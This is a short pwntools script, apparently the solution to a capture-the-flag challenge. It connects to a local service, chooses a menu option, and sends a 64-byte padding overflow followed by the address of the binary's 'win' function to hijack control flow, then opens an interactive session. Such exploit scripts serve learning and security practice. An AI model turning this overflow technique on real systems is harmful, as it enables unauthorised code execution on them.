from pwn import *

exe = ELF("chall")

io = remote("localhost",3000)
#io = exe.process()


io.recv()
io.sendline(b"1")
io.recv()
io.sendline(64*b'A'+p64(exe.sym.win))

io.recv()
io.sendline(b"3")

io.interactive()

